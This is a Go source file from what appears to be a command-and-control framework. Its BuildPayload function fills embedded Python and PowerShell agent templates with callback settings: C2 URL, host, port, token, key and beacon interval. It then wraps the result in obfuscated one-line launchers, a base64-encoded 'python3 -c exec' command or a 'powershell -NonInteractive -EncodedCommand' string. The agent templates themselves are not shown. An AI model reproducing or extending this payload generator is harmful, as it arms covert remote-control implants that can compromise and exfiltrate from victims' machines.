package c2

import (
	"bytes"
	_ "embed"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"text/template"
	"unicode/utf16"
)

//go:embed templates/agent.py.tmpl
var pythonTemplate string

//go:embed templates/agent.ps1.tmpl
var powershellTemplate string

type PayloadConfig struct {
	URL       string `json:"url"`
	Host      string `json:"host"`
	Port      int    `json:"port"`
	Token     string `json:"token"`
	Key       string `json:"key"`
	UUID      string `json:"uuid"`
	Interval  int    `json:"interval"`
	Transport string `json:"transport"`
	Envelope  string `json:"envelope"`
}

func BuildPayload(c PayloadConfig, os string) (string, string, error) {
	if _, err := ParseKey(c.Key); err != nil {
		return "", "", err
	}
	b, err := json.Marshal(c)
	if err != nil {
		return "", "", err
	}
	src := pythonTemplate
	if os == "windows" {
		src = powershellTemplate
	} else if os != "linux" && os != "darwin" {
		return "", "", fmt.Errorf("os must be linux, darwin or windows")
	}
	t, err := template.New("payload").Parse(src)
	if err != nil {
		return "", "", err
	}
	var out bytes.Buffer
	if err = t.Execute(&out, map[string]string{"Config": base64.StdEncoding.EncodeToString(b)}); err != nil {
		return "", "", err
	}
	script := out.String()
	if os == "windows" {
		words := utf16.Encode([]rune(script))
		raw := make([]byte, len(words)*2)
		for i, v := range words {
			binary.LittleEndian.PutUint16(raw[i*2:], v)
		}
		shell := "powershell"
		if c.Envelope == "gcm" {
			shell = "pwsh"
		}
		return script, shell + " -NoProfile -NonInteractive -EncodedCommand " + base64.StdEncoding.EncodeToString(raw), nil
	}
	return script, "python3 -c \"import base64;exec(base64.b64decode('" + base64.StdEncoding.EncodeToString([]byte(script)) + "'))\"", nil
}
